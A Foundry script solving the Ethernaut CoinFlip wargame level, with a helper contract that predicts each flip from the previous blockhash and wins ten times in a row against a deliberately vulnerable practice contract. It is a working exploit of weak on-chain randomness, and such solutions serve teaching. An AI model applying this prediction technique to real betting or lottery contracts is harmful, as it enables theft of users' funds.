// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// Import challenge contract here
import {CoinFlip} from "../../challenge-contracts/03-CoinFlip.sol";

contract CoinFlipSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Player contract;
        Player caller = new Player(challengeInstance);

        // Step 2: Call `play()` function in Player contract for 10 times;
        uint blockNumber = block.number - 10;
        for (uint i = 0; i < 10; i++) {
            // `vm.roll()` is used to mimic block number;
            // Can only mock past block number (mock future block number will get identical hash)
            vm.roll(blockNumber + i);

            // Calling `play()` function in Player contract;
            // Player contract in turn calls `flip()` function in CoinFlip contract;
            caller.play();
        }

        // Step 3: Confirm that `consecutiveWins` of CoinFlip contract is now `10`.
        CoinFlip coin = CoinFlip(challengeInstance);
        require(coin.consecutiveWins() == 10, "consecutiveWins check failed");
        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(3));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Player {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlip;

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
    }

    function showWinNo() public view returns (uint) {
        return coinFlip.consecutiveWins();
    }

    function play() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 side = blockValue / FACTOR;
        bool guess = side == 1 ? true : false;
        bool success = coinFlip.flip(guess);
        require(success, "Guess wrongly");
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
